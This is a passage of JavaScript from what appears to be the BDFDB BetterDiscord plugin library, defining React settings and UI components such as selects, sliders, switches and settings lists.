					this.props.value = option;
					if (typeof this.props.onChange == "function") this.props.onChange(option.value || option.key, this);
					BDFDB.ReactUtils.forceUpdate(this);
				}
				render() {
					let options = (BDFDB.ArrayUtils.is(this.props.options) ? this.props.options : [{}]).filter(n => n);
					let selectedOption = BDFDB.ObjectUtils.is(this.props.value) ? this.props.value : (options[0] || {});
					return BDFDB.ReactUtils.createElement("div", {
						className: BDFDB.DOMUtils.formatClassName(this.props.className, BDFDB.disCN.quickselectwrapper),
						children: BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Flex, {
							className: BDFDB.disCN.quickselect,
							align: Internal.LibraryComponents.Flex.Align.CENTER,
							children: [
								BDFDB.ReactUtils.createElement("div", {
									className: BDFDB.disCN.quickselectlabel,
									children: this.props.label
								}),
								BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Flex, {
									align: Internal.LibraryComponents.Flex.Align.CENTER,
									className: BDFDB.disCN.quickselectclick,
									onClick: event => {
										Internal.LibraryModules.ContextMenuUtils.openContextMenu(event, _ => BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Menu, {
											navId: "bdfdb-quickselect",
											onClose: Internal.LibraryModules.ContextMenuUtils.closeContextMenu,
											className: this.props.popoutClassName,
											children: BDFDB.ContextMenuUtils.createItem(Internal.LibraryComponents.MenuItems.MenuGroup, {
												children: options.map((option, i) => {
													let selected = option.value && option.value === selectedOption.value || option.key && option.key === selectedOption.key;
													return BDFDB.ContextMenuUtils.createItem(Internal.LibraryComponents.MenuItems.MenuItem, {
														label: option.label,
														id: BDFDB.ContextMenuUtils.createItemId("option", option.key || option.value || i),
														action: selected ? null : event2 => this.handleChange.bind(this)(option)
													});
												})
											})
										}));
									},
									children: [
										BDFDB.ReactUtils.createElement("div", {
											className: BDFDB.disCN.quickselectvalue,
											children: typeof this.props.renderValue == "function" ? this.props.renderValue(this.props.value) : this.props.value.label
										}),
										BDFDB.ReactUtils.createElement("div", {
											className: BDFDB.disCN.quickselectarrow
										})
									]
								})
							]
						})
					});
				}
			};
			
			CustomComponents.RadioGroup = reactInitialized && class BDFDB_RadioGroup extends Internal.LibraryModules.React.Component {
				handleChange(value) {
					this.props.value = value.value;
					if (typeof this.props.onChange == "function") this.props.onChange(value, this);
					BDFDB.ReactUtils.forceUpdate(this);
				}
				render() {
					return BDFDB.ReactUtils.createElement(Internal.NativeSubComponents.RadioGroup, Object.assign({}, this.props, {
						onChange: this.handleChange.bind(this)
					}));
				}
			};
			
			CustomComponents.SearchBar = reactInitialized && class BDFDB_SearchBar extends Internal.LibraryModules.React.Component {
				handleChange(query) {
					this.props.query = query;
					if (typeof this.props.onChange == "function") this.props.onChange(query, this);
					BDFDB.ReactUtils.forceUpdate(this);
				}
				handleClear() {
					this.props.query = "";
					if (this.props.changeOnClear && typeof this.props.onChange == "function") this.props.onChange("", this);
					if (typeof this.props.onClear == "function") this.props.onClear(this);
					BDFDB.ReactUtils.forceUpdate(this);
				}
				render() {
					let props = Object.assign({}, this.props, {
						onChange: this.handleChange.bind(this),
						onClear: this.handleClear.bind(this)
					});
					if (typeof props.query != "string") props.query = "";
					return BDFDB.ReactUtils.createElement(Internal.NativeSubComponents.SearchBar, props);
				}
			};
			
			CustomComponents.Select = reactInitialized && class BDFDB_Select extends Internal.LibraryModules.React.Component {
				handleChange(value) {
					this.props.value = value.value || value;
					if (typeof this.props.onChange == "function") this.props.onChange(value, this);
					BDFDB.ReactUtils.forceUpdate(this);
				}
				render() {
					return BDFDB.ReactUtils.createElement("div", {
						className: BDFDB.DOMUtils.formatClassName(this.props.className, BDFDB.disCN.selectwrapper),
						children: BDFDB.ReactUtils.createElement(Internal.NativeSubComponents.SearchableSelect, BDFDB.ObjectUtils.exclude(Object.assign({}, this.props, {
							className: this.props.inputClassName,
							autoFocus: this.props.autoFocus ? this.props.autoFocus : false,
							maxVisibleItems: this.props.maxVisibleItems || 7,
							renderOptionLabel: this.props.optionRenderer,
							onChange: this.handleChange.bind(this)
						}), "inputClassName", "optionRenderer"))
					});
				}
			};
			
			CustomComponents.SettingsGuildList = reactInitialized && class BDFDB_SettingsGuildList extends Internal.LibraryModules.React.Component {
				render() {
					this.props.disabled = BDFDB.ArrayUtils.is(this.props.disabled) ? this.props.disabled : [];
					return BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Flex, {
						className: this.props.className,
						wrap: Internal.LibraryComponents.Flex.Wrap.WRAP,
						children: [this.props.includeDMs && {name: BDFDB.LanguageUtils.LanguageStrings.DIRECT_MESSAGES, acronym: "DMs", id: BDFDB.DiscordConstants.ME, getIconURL: _ => {}}].concat(Internal.LibraryModules.FolderStore.getFlattenedGuilds()).filter(n => n).map(guild => BDFDB.ReactUtils.createElement(Internal.LibraryComponents.TooltipContainer, {
							text: guild.name,
							children: BDFDB.ReactUtils.createElement("div", {
								className: BDFDB.DOMUtils.formatClassName(this.props.guildClassName, BDFDB.disCN.settingsguild, this.props.disabled.includes(guild.id) && BDFDB.disCN.settingsguilddisabled),
								children: BDFDB.ReactUtils.createElement(Internal.LibraryComponents.GuildComponents.Icon, {
									guild: guild,
									size: this.props.size || Internal.LibraryComponents.GuildComponents.Icon.Sizes.MEDIUM
								}),
								onClick: e => {
									let isDisabled = this.props.disabled.includes(guild.id);
									if (isDisabled) BDFDB.ArrayUtils.remove(this.props.disabled, guild.id, true);
									else this.props.disabled.push(guild.id);
									if (typeof this.props.onClick == "function") this.props.onClick(this.props.disabled, this);
									BDFDB.ReactUtils.forceUpdate(this);
								}
							})
						}))
					});
				}
			};
			
			CustomComponents.SettingsPanel = reactInitialized && class BDFDB_SettingsPanel extends Internal.LibraryModules.React.Component {
				componentDidMount() {
					this.props._instance = this;
					let node = BDFDB.ReactUtils.findDOMNode(this);
					if (node) this.props._node = node;
				}
				componentWillUnmount() {
					if (BDFDB.ObjectUtils.is(this.props.addon) && typeof this.props.addon.onSettingsClosed == "function") this.props.addon.onSettingsClosed();
				}
				render() {						
					let panelItems = [
						BDFDB.ReactUtils.createElement(Internal.LibraryComponents.AutoFocusCatcher, {}),
						typeof this.props.children == "function" ? (_ => {
							return this.props.children(this.props.collapseStates);
						})() : this.props.children
					].flat(10).filter(n => n);
					
					return BDFDB.ReactUtils.createElement("div", {
						key: this.props.addon && this.props.addon.name && `${this.props.addon.name}-settingsPanel`,
						id: this.props.addon && this.props.addon.name && `${this.props.addon.name}-settings`,
						className: BDFDB.disCN.settingspanel,
						children: panelItems
					});
				}
			};
			
			CustomComponents.SettingsPanelList = reactInitialized && class BDFDB_SettingsPanelInner extends Internal.LibraryModules.React.Component {
				render() {
					return this.props.children ? BDFDB.ReactUtils.createElement("div", {
						className: BDFDB.DOMUtils.formatClassName(this.props.className, BDFDB.disCN.settingspanellistwrapper, this.props.mini && BDFDB.disCN.settingspanellistwrappermini),
						children: [
							this.props.dividerTop ? BDFDB.ReactUtils.createElement(Internal.LibraryComponents.FormComponents.FormDivider, {
								className: this.props.mini ? BDFDB.disCN.marginbottom4 : BDFDB.disCN.marginbottom8
							}) : null,
							typeof this.props.title == "string" ? BDFDB.ReactUtils.createElement(Internal.LibraryComponents.FormComponents.FormTitle, {
								className: BDFDB.disCN.marginbottom4,
								tag: Internal.LibraryComponents.FormComponents.FormTitle.Tags.H3,
								children: this.props.title
							}) : null,
							BDFDB.ReactUtils.createElement("div", {
								className: BDFDB.disCN.settingspanellist,
								children: this.props.children
							}),
							this.props.dividerBottom ? BDFDB.ReactUtils.createElement(Internal.LibraryComponents.FormComponents.FormDivider, {
								className: this.props.mini ? BDFDB.disCN.margintop4 : BDFDB.disCN.margintop8
							}) : null
						]
					}) : null;
				}
			};
			
			CustomComponents.SettingsItem = reactInitialized && class BDFDB_SettingsItem extends Internal.LibraryModules.React.Component {
				handleChange(value) {
					if (typeof this.props.onChange == "function") this.props.onChange(value, this);
				}
				render() {
					if (typeof this.props.type != "string" || !["BUTTON", "SELECT", "SLIDER", "SWITCH", "TEXTINPUT"].includes(this.props.type.toUpperCase())) return null;
					let childComponent = Internal.LibraryComponents[this.props.type];
					if (!childComponent) return null;
					if (this.props.mini && childComponent.Sizes) this.props.size = childComponent.Sizes.MINI || childComponent.Sizes.MIN;
					let label = this.props.label ? (this.props.tag ? BDFDB.ReactUtils.createElement(Internal.LibraryComponents.FormComponents.FormTitle, {
						className: BDFDB.DOMUtils.formatClassName(this.props.labelClassName, BDFDB.disCN.marginreset),
						tag: this.props.tag,
						children: this.props.label
					}) : BDFDB.ReactUtils.createElement(Internal.LibraryComponents.SettingsLabel, {
						className: BDFDB.DOMUtils.formatClassName(this.props.labelClassName),
						mini: this.props.mini,
						label: this.props.label
					})) : null;
					let margin = this.props.margin != null ? this.props.margin : (this.props.mini ? 0 : 8);
					return BDFDB.ReactUtils.createElement("div", {
						className: BDFDB.DOMUtils.formatClassName(this.props.className, BDFDB.disCN.settingsrow, BDFDB.disCN.settingsrowcontainer, this.props.disabled && BDFDB.disCN.settingsrowdisabled, margin != null && (DiscordClasses[`marginbottom${margin}`] && BDFDB.disCN[`marginbottom${margin}`] || margin == 0 && BDFDB.disCN.marginreset)),
						id: this.props.id,
						children: [
							this.props.dividerTop ? BDFDB.ReactUtils.createElement(Internal.LibraryComponents.FormComponents.FormDivider, {
								className: this.props.mini ? BDFDB.disCN.marginbottom4 : BDFDB.disCN.marginbottom8
							}) : null,
							BDFDB.ReactUtils.createElement("div", {
								className: BDFDB.disCN.settingsrowlabel,
								children: [
									label && !this.props.basis ? BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Flex.Child, {
										grow: 1,
										shrink: 1,
										wrap: true,
										children: label
									}) : label,
									this.props.labelChildren,
									BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Flex.Child, {
										className: BDFDB.disCNS.settingsrowcontrol + BDFDB.disCN.flexchild,
										grow: 0,
										shrink: this.props.basis ? 0 : 1,
										basis: this.props.basis,
										wrap: true,
										children: BDFDB.ReactUtils.createElement(childComponent, BDFDB.ObjectUtils.exclude(Object.assign(BDFDB.ObjectUtils.exclude(this.props, "className", "id", "type"), this.props.childProps, {
											onChange: this.handleChange.bind(this),
											onValueChange: this.handleChange.bind(this)
										}), "basis", "margin", "dividerBottom", "dividerTop", "label", "labelClassName", "labelChildren", "tag", "mini", "note", "childProps"))
									})
								].flat(10).filter(n => n)
							}),
							typeof this.props.note == "string" ? BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Flex.Child, {
								className: BDFDB.disCN.settingsrownote,
								children: BDFDB.ReactUtils.createElement(Internal.LibraryComponents.FormComponents.FormText, {
									disabled: this.props.disabled,
									type: Internal.LibraryComponents.FormComponents.FormText.Types.DESCRIPTION,
									children: BDFDB.ReactUtils.createElement(Internal.LibraryComponents.TextScroller, {speed: 2, children: this.props.note})
								})
							}) : null,
							this.props.dividerBottom ? BDFDB.ReactUtils.createElement(Internal.LibraryComponents.FormComponents.FormDivider, {
								className: this.props.mini ? BDFDB.disCN.margintop4 : BDFDB.disCN.margintop8
							}) : null
						]
					});
				}
			};
			
			CustomComponents.SettingsLabel = reactInitialized && class BDFDB_SettingsLabel extends Internal.LibraryModules.React.Component {
				render() {
					return BDFDB.ReactUtils.createElement(Internal.LibraryComponents.TextScroller, {
						className: BDFDB.DOMUtils.formatClassName(this.props.className, BDFDB.disCN.settingsrowtitle, this.props.mini ? BDFDB.disCN.settingsrowtitlemini : BDFDB.disCN.settingsrowtitledefault, BDFDB.disCN.cursordefault),
						speed: 2,
						children: this.props.label
					});
				}	
			};
			
			CustomComponents.SettingsList = reactInitialized && class BDFDB_SettingsList extends Internal.LibraryModules.React.Component {
				componentDidMount() {
					this.checkList();
				}
				componentDidUpdate() {
					this.checkList();
				}
				checkList() {
					let list = BDFDB.ReactUtils.findDOMNode(this);
					if (list && !this.props.configWidth) {
						let headers = Array.from(list.querySelectorAll(BDFDB.dotCN.settingstableheader));
						headers.shift();
						if (BDFDB.DOMUtils.getRects(headers[0]).width == 0) BDFDB.TimeUtils.timeout(_ => {this.resizeList(headers);});
						else this.resizeList(headers);
					}
				}
				resizeList(headers) {
					let configWidth = 0, biggestWidth = 0;
					if (!configWidth) {
						for (let header of headers) {
							header.style = "";
							let width = BDFDB.DOMUtils.getRects(header).width;
							configWidth = width > configWidth ? width : configWidth;
						}
						configWidth += 4;
						biggestWidth = configWidth;
					}
					if (headers.length * configWidth > 300) {
						this.props.vertical = true;
						configWidth = parseInt(290 / headers.length);
					}
					else if (configWidth < 36) {
						configWidth = 36;
						biggestWidth = configWidth;
					}
					this.props.configWidth = configWidth;
					this.props.biggestWidth = biggestWidth;
					BDFDB.ReactUtils.forceUpdate(this);
				}
				renderHeaderOption(props) {
					return BDFDB.ReactUtils.createElement("div", {
						className: BDFDB.DOMUtils.formatClassName(props.className, BDFDB.disCN.colorbase, BDFDB.disCN.size10, props.clickable && BDFDB.disCN.cursorpointer),
						onClick: _ => {if (typeof this.props.onHeaderClick == "function") this.props.onHeaderClick(props.label, this);},
						onContextMenu: _ => {if (typeof this.props.onHeaderContextMenu == "function") this.props.onHeaderContextMenu(props.label, this);},
						children: BDFDB.ReactUtils.createElement("span", {
							children: props.label
						})
					});
				}
				renderItem(props) {
					return BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Card, BDFDB.ObjectUtils.exclude(Object.assign({}, this.props, {
						className: BDFDB.DOMUtils.formatClassName([this.props.cardClassName, props.className].filter(n => n).join(" ").indexOf(BDFDB.disCN.card) == -1 && BDFDB.disCN.cardprimaryoutline, BDFDB.disCN.settingstablecard, this.props.cardClassName, props.className),
						cardId: props.key,
						backdrop: false,
						horizontal: true,
						style: Object.assign({}, this.props.cardStyle, props.style),
						children: [
							BDFDB.ReactUtils.createElement("div", {
								className: BDFDB.disCN.settingstablecardlabel,
								children: this.props.renderLabel(props, this)
							}),
							BDFDB.ReactUtils.createElement("div", {
								className: BDFDB.disCN.settingstablecardconfigs,
								style: {
									width: props.wrapperWidth || null,
									minWidth: props.wrapperWidth || null,
									maxWidth: props.wrapperWidth || null
								},
								children: this.props.settings.map(setting => BDFDB.ReactUtils.createElement("div", {
									className: BDFDB.disCN.checkboxcontainer,
									children: BDFDB.ReactUtils.createElement(Internal.LibraryComponents.TooltipContainer, {
										text: setting,
										children: BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Checkbox, {
											disabled: props.disabled,
											cardId: props.key,
											settingId: setting,
											shape: Internal.LibraryComponents.Checkbox.Shapes && Internal.LibraryComponents.Checkbox.Shapes.ROUND,
											type: Internal.LibraryComponents.Checkbox.Types && Internal.LibraryComponents.Checkbox.Types.INVERTED,
											color: this.props.checkboxColor,
											getColor: this.props.getCheckboxColor,
											value: props[setting],
											getValue: this.props.getCheckboxValue,
											onChange: this.props.onCheckboxChange
										})
									})
								})).flat(10).filter(n => n)
							})
						]
					}), "title", "data", "settings", "renderLabel", "cardClassName", "cardStyle", "checkboxColor", "getCheckboxColor",  "getCheckboxValue", "onCheckboxChange", "configWidth", "biggestWidth", "pagination"));
				}
				render() {
					this.props.settings = BDFDB.ArrayUtils.is(this.props.settings) ? this.props.settings : [];
					this.props.renderLabel = typeof this.props.renderLabel == "function" ? this.props.renderLabel : data => data.label;
					this.props.data = (BDFDB.ArrayUtils.is(this.props.data) ? this.props.data : [{}]).filter(n => n);
					
					let wrapperWidth = this.props.configWidth && this.props.configWidth * this.props.settings.length;
					let isHeaderClickable = typeof this.props.onHeaderClick == "function" || typeof this.props.onHeaderContextMenu == "function";
					let usePagination = BDFDB.ObjectUtils.is(this.props.pagination);
					
					let header = BDFDB.ReactUtils.createElement("div", {
						className: BDFDB.disCN.settingstableheaders,
						style: this.props.vertical && this.props.biggestWidth ? {
							marginTop: this.props.biggestWidth - 15 || 0
						} : {},
						children: [
							this.renderHeaderOption({
								className: BDFDB.disCN.settingstableheadername,
								clickable: this.props.title && isHeaderClickable,
								label: this.props.title || ""
							}),
							BDFDB.ReactUtils.createElement("div", {
								className: BDFDB.disCN.settingstableheaderoptions,
								style: {
									width: wrapperWidth || null,
									minWidth: wrapperWidth || null,
									maxWidth: wrapperWidth || null
								},
								children: this.props.settings.map(setting => this.renderHeaderOption({
									className: BDFDB.DOMUtils.formatClassName(BDFDB.disCN.settingstableheaderoption, this.props.vertical && BDFDB.disCN.settingstableheadervertical),
									clickable: isHeaderClickable,
									label: setting
								}))
							})
						]
					});
					return !this.props.data.length ? null : BDFDB.ReactUtils.createElement("div", {
						className: BDFDB.DOMUtils.formatClassName(BDFDB.disCN.settingstablelist, this.props.className),
						children: [
							!usePagination && header,
							!usePagination ? this.props.data.map(data => this.renderItem(Object.assign({}, data, {wrapperWidth}))) : BDFDB.ReactUtils.createElement(Internal.LibraryComponents.PaginatedList, Object.assign({}, this.props.pagination, {
								header: header,
								items: this.props.data,
								renderItem: data => this.renderItem(Object.assign({}, data, {wrapperWidth})),
								onJump: (offset, instance) => {
									this.props.pagination.offset = offset;
									if (typeof this.props.pagination.onJump == "function") this.props.pagination.onJump(offset, this, instance);
								}
							}))
						].filter(n => n)
					});
				}
			};
			
			CustomComponents.SettingsSaveItem = reactInitialized && class BDFDB_SettingsSaveItem extends Internal.LibraryModules.React.Component {
				saveSettings(value) {
					if (!BDFDB.ArrayUtils.is(this.props.keys) || !BDFDB.ObjectUtils.is(this.props.plugin)) return;
					let keys = this.props.keys.filter(n => n);
					let option = keys.shift();
					if (BDFDB.ObjectUtils.is(this.props.plugin) && option) {
						let data = BDFDB.DataUtils.load(this.props.plugin, option);
						let newC = "";
						for (let key of keys) newC += `{"${key}":`;
						value = value != null && value.value != null ? value.value : value;
						let isString = typeof value == "string";
						let marker = isString ? `"` : ``;
						newC += (marker + (isString ? value.replace(/\\/g, "\\\\") : value) + marker) + "}".repeat(keys.length);
						newC = JSON.parse(newC);
						newC = BDFDB.ObjectUtils.is(newC) ? BDFDB.ObjectUtils.deepAssign({}, data, newC) : newC;
						BDFDB.DataUtils.save(newC, this.props.plugin, option);
						if (!this.props.plugin.settings) this.props.plugin.settings = {};
						this.props.plugin.settings[option] = newC;
						this.props.plugin.SettingsUpdated = true;
					}
					if (typeof this.props.onChange == "function") this.props.onChange(value, this);
				}
				render() {
					if (typeof this.props.type != "string" || !["SELECT", "SLIDER", "SWITCH", "TEXTINPUT"].includes(this.props.type.toUpperCase())) return null;
					return BDFDB.ReactUtils.createElement(Internal.LibraryComponents.SettingsItem, BDFDB.ObjectUtils.exclude(Object.assign({}, this.props, {
						onChange: this.saveSettings.bind(this)
					}), "keys", "key", "plugin"));
				}
			};
			
			CustomComponents.SidebarList = reactInitialized && class BDFDB_SidebarList extends Internal.LibraryModules.React.Component {
				handleItemSelect(item) {
					this.props.selectedItem = item;
					if (typeof this.props.onItemSelect == "function") this.props.onItemSelect(item, this);
					BDFDB.ReactUtils.forceUpdate(this);
				}
				render() {
					let items = (BDFDB.ArrayUtils.is(this.props.items) ? this.props.items : [{}]).filter(n => n);
					let selectedItem = this.props.selectedItem || (items[0] || {}).value;
					let selectedElements = (items.find(n => n.value == selectedItem) || {}).elements;
					let renderElement = typeof this.props.renderElement == "function" ? this.props.renderElement : (_ => {});
					return BDFDB.ReactUtils.createElement("div", {
						className: BDFDB.DOMUtils.formatClassName(this.props.className, BDFDB.disCN.sidebarlist),
						children: [
							BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Scrollers.Thin, {
								className: BDFDB.DOMUtils.formatClassName(this.props.sidebarClassName, BDFDB.disCN.sidebar),
								fade: true,
								children: BDFDB.ReactUtils.createElement(Internal.LibraryComponents.TabBar, {
									itemClassName: this.props.itemClassName,
									type: Internal.LibraryComponents.TabBar.Types.SIDE,
									items: items,
									selectedItem: selectedItem,
									renderItem: this.props.renderItem,
									onItemSelect: this.handleItemSelect.bind(this)
								})
							}),
							BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Scrollers.Thin, {
								className: BDFDB.DOMUtils.formatClassName(this.props.contentClassName, BDFDB.disCN.sidebarcontent),
								fade: true,
								children: [selectedElements].flat(10).filter(n => n).map(data => renderElement(data))
							})
						]
					});
				}
			};
			
			CustomComponents.Slider = reactInitialized && class BDFDB_Slider extends Internal.LibraryModules.React.Component {
				handleMarkerRender(marker) {
					let newMarker = BDFDB.NumberUtils.mapRange([0, 100], this.props.edges, marker);
					if (typeof this.props.digits == "number") newMarker = Math.round(newMarker * Math.pow(10, this.props.digits)) / Math.pow(10, this.props.digits);
					return newMarker;
				}
				handleValueChange(value) {
					let newValue = BDFDB.NumberUtils.mapRange([0, 100], this.props.edges, value);
					if (typeof this.props.digits == "number") newValue = Math.round(newValue * Math.pow(10, this.props.digits)) / Math.pow(10, this.props.digits);
					this.props.defaultValue = this.props.value = newValue;
					if (typeof this.props.onValueChange == "function") this.props.onValueChange(newValue, this);
					BDFDB.ReactUtils.forceUpdate(this);
				}
				handleValueRender(value) {
					let newValue = BDFDB.NumberUtils.mapRange([0, 100], this.props.edges, value);
					if (typeof this.props.digits == "number") newValue = Math.round(newValue * Math.pow(10, this.props.digits)) / Math.pow(10, this.props.digits);
					if (typeof this.props.onValueRender == "function") {
						let tempReturn = this.props.onValueRender(newValue, this);
						if (tempReturn != undefined) newValue = tempReturn;
					}
					return newValue;
				}
				render() {
					let value = this.props.value || this.props.defaultValue || 0;
					if (!BDFDB.ArrayUtils.is(this.props.edges) || this.props.edges.length != 2) this.props.edges = [this.props.min || this.props.minValue || 0, this.props.max || this.props.maxValue || 100];
					this.props.minValue = 0;
					this.props.maxValue = 100;
					let defaultValue = BDFDB.NumberUtils.mapRange(this.props.edges, [0, 100], value);
					if (typeof this.props.digits == "number") defaultValue = Math.round(defaultValue * Math.pow(10, this.props.digits)) / Math.pow(10, this.props.digits);
					return BDFDB.ReactUtils.createElement(Internal.NativeSubComponents.Slider, BDFDB.ObjectUtils.exclude(Object.assign({}, this.props, {
						initialValue: defaultValue,
						markers: typeof this.props.markerAmount == "number" ? Array.from(Array(this.props.markerAmount).keys()).map((_, i) => i * (this.props.maxValue - this.props.minValue)/10) : undefined,
						onMarkerRender: this.handleMarkerRender.bind(this),
						onValueChange: this.handleValueChange.bind(this),
						onValueRender: this.handleValueRender.bind(this)
					}), "digits", "edges", "max", "min", "markerAmount"));
				}
			};
			Internal.setDefaultProps(CustomComponents.Slider, {hideBubble: false, digits: 3});
			
			CustomComponents.SvgIcon = reactInitialized && class BDFDB_Icon extends Internal.LibraryModules.React.Component {
				render() {
					if (BDFDB.ObjectUtils.is(this.props.name)) {
						let calcClassName = [];
						if (BDFDB.ObjectUtils.is(this.props.name.getClassName)) for (let path in this.props.name.getClassName) {
							if (!path || BDFDB.ObjectUtils.get(this, path)) calcClassName.push(BDFDB.disCN[this.props.name.getClassName[path]]);
						}
						if (calcClassName.length || this.props.className) this.props.nativeClass = true;
						this.props.iconSVG = this.props.name.icon;
						let props = Object.assign({
							width: 24,
							height: 24,
							color: "currentColor"
						}, this.props.name.defaultProps, this.props, {
							className: BDFDB.DOMUtils.formatClassName(calcClassName, this.props.className)
						});
						for (let key in props) this.props.iconSVG = this.props.iconSVG.replace(new RegExp(`%%${key}`, "g"), props[key]);
					}
					if (this.props.iconSVG) {
						let icon = BDFDB.ReactUtils.elementToReact(BDFDB.DOMUtils.create(this.props.iconSVG));
						if (BDFDB.ReactUtils.isValidElement(icon)) {
							icon.props.className = BDFDB.DOMUtils.formatClassName(!this.props.nativeClass && BDFDB.disCN.svgicon, icon.props.className, this.props.className);
							icon.props.style = Object.assign({}, icon.props.style, this.props.style);
							icon.props = Object.assign({}, BDFDB.ObjectUtils.extract(this.props, "onClick", "onContextMenu", "onMouseDown", "onMouseUp", "onMouseEnter", "onMouseLeave"), icon.props);
							return icon;
						}
					}
					return null;
				}
			};
			CustomComponents.SvgIcon.Names = InternalData.SvgIcons || {};
			
			const SwitchIconPaths = {
				a: {
					TOP: "M5.13231 6.72963L6.7233 5.13864L14.855 13.2704L13.264 14.8614L5.13231 6.72963Z",
					BOTTOM: "M13.2704 5.13864L14.8614 6.72963L6.72963 14.8614L5.13864 13.2704L13.2704 5.13864Z"
				},
				b: {
					TOP: "M6.56666 11.0013L6.56666 8.96683L13.5667 8.96683L13.5667 11.0013L6.56666 11.0013Z",
					BOTTOM: "M13.5582 8.96683L13.5582 11.0013L6.56192 11.0013L6.56192 8.96683L13.5582 8.96683Z"
				},
				c: {
					TOP: "M7.89561 14.8538L6.30462 13.2629L14.3099 5.25755L15.9009 6.84854L7.89561 14.8538Z",
					BOTTOM: "M4.08643 11.0903L5.67742 9.49929L9.4485 13.2704L7.85751 14.8614L4.08643 11.0903Z"
				}
			};
			const SwitchInner = function (props) {
				let reducedMotion = BDFDB.ReactUtils.useContext(Internal.LibraryModules.PreferencesContext.AccessibilityPreferencesContext).reducedMotion;
				let ref = BDFDB.ReactUtils.useRef(null);
				let state = BDFDB.ReactUtils.useState(false);
				let animation = Internal.LibraryComponents.Animations.useSpring({
					config: {
						mass: 1,
						tension: 250
					},
					opacity: props.disabled ? .3 : 1,
					state: state[0] ? (props.value ? .7 : .3) : (props.value ? 1 : 0)
				});
				let fill = animation.state.to({
					output: [props.uncheckedColor, props.checkedColor]
				});
				let mini = props.size == Internal.LibraryComponents.Switch.Sizes.MINI;
				
				return BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Animations.animated.div, {
					className: BDFDB.DOMUtils.formatClassName(props.className, BDFDB.disCN.switch, mini && BDFDB.disCN.switchmini),
					onMouseDown: _ => {
						return !props.disabled && state[1](true);
					},
					onMouseUp: _ => {
						return state[1](false);
					},
					onMouseLeave: _ => {
						return state[1](false);
					},
					style: {
						opacity: animation.opacity,
						backgroundColor: animation.state.to({
							output: [props.uncheckedColor, props.checkedColor]
						})
					},
					tabIndex: -1,
					children: [
						BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Animations.animated.svg, {
							className: BDFDB.disCN.switchslider,
							viewBox: "0 0 28 20",
							preserveAspectRatio: "xMinYMid meet",
							style: {
								left: animation.state.to({
									range: [0, .3, .7, 1],
									output: mini ? [-1, 2, 6, 9] : [-3, 1, 8, 12]
								})
							},
							children: [
								BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Animations.animated.rect, {
									fill: "white",
									x: animation.state.to({
										range: [0, .3, .7, 1],
										output: [4, 0, 0, 4]
									}),
									y: animation.state.to({
										range: [0, .3, .7, 1],
										output: [0, 1, 1, 0]
									}),
									height: animation.state.to({
										range: [0, .3, .7, 1],
										output: [20, 18, 18, 20]
									}),
									width: animation.state.to({
										range: [0, .3, .7, 1],
										output: [20, 28, 28, 20]
									}),
									rx: "10"
								}),
								BDFDB.ReactUtils.createElement("svg", {
									viewBox: "0 0 20 20",
									fill: "none",
									children: [
										BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Animations.animated.path, {
											fill: fill,
											d: animation.state.to({
												range: [0, .3, .7, 1],
												output: reducedMotion.enabled ? [SwitchIconPaths.a.TOP, SwitchIconPaths.a.TOP, SwitchIconPaths.c.TOP, SwitchIconPaths.c.TOP] : [SwitchIconPaths.a.TOP, SwitchIconPaths.b.TOP, SwitchIconPaths.b.TOP, SwitchIconPaths.c.TOP]
											})
										}),
										BDFDB.ReactUtils.createElement(Internal.LibraryComponents.Animations.animated.path, {
											fill: fill,
											d: animation.state.to({
												range: [0, .3, .7, 1],
												output: reducedMotion.enabled ? [SwitchIconPaths.a.BOTTOM, SwitchIconPaths.a.BOTTOM, SwitchIconPaths.c.BOTTOM, SwitchIconPaths.c.BOTTOM] : [SwitchIconPaths.a.BOTTOM, SwitchIconPaths.b.BOTTOM, SwitchIconPaths.b.BOTTOM, SwitchIconPaths.c.BOTTOM]
											})
										})
									]
								})
							]
						}),
						BDFDB.ReactUtils.createElement("input", BDFDB.ObjectUtils.exclude(Object.assign({}, props, {
							id: props.id,
							type: "checkbox",
							ref: ref,
							className: BDFDB.DOMUtils.formatClassName(props.inputClassName, BDFDB.disCN.switchinner),
							tabIndex: props.disabled ? -1 : 0,
							onKeyDown: e => {
								if (!props.disabled && !e.repeat && (e.key == " " || e.key == "Enter")) state[1](true);
							},
							onKeyUp: e => {
								if (!props.disabled && !e.repeat) {
									state[1](false);
									if (e.key == "Enter" && ref.current) ref.current.click();
								}
							},
							onChange: e => {
								state[1](false);
								if (typeof props.onChange == "function") props.onChange(e.currentTarget.checked, e);
							},
							checked: props.value,
							disabled: props.disabled
						}), "uncheckedColor", "checkedColor", "size", "value"))
					]
				});
			};
			CustomComponents.Switch = reactInitialized && class BDFDB_Switch extends Internal.LibraryModules.React.Component {
				handleChange() {
					this.props.value = !this.props.value;
					if (typeof this.props.onChange == "function") this.props.onChange(this.props.value, this);
					BDFDB.ReactUtils.forceUpdate(this);
				}
				render() {
					return BDFDB.ReactUtils.createElement(SwitchInner, Object.assign({}, this.props, {
						onChange: this.handleChange.bind(this)
					}));
				}
			};
			CustomComponents.Switch.Sizes = {
				DEFAULT: "default",
				MINI: "mini",
			};
			Internal.setDefaultProps(CustomComponents.Switch, {
				size: CustomComponents.Switch.Sizes.DEFAULT,
				uncheckedColor: BDFDB.DiscordConstants.Colors.PRIMARY_DARK_400,
				checkedColor: BDFDB.DiscordConstants.Colors.BRAND
			});
			
			CustomComponents.TabBar = reactInitialized && class BDFDB_TabBar extends Internal.LibraryModules.React.Component {
				handleItemSelect(item) {
					this.props.selectedItem = item;
					if (typeof this.props.onItemSelect == "function") this.props.onItemSelect(item, this);
					BDFDB.ReactUtils.forceUpdate(this);
				}
				render() {
					let items = (BDFDB.ArrayUtils.is(this.props.items) ? this.props.items : [{}]).filter(n => n);
					let selectedItem = this.props.selectedItem || (items[0] || {}).value;
					let renderItem = typeof this.props.renderItem == "function" ? this.props.renderItem : (data => data.label || data.value);
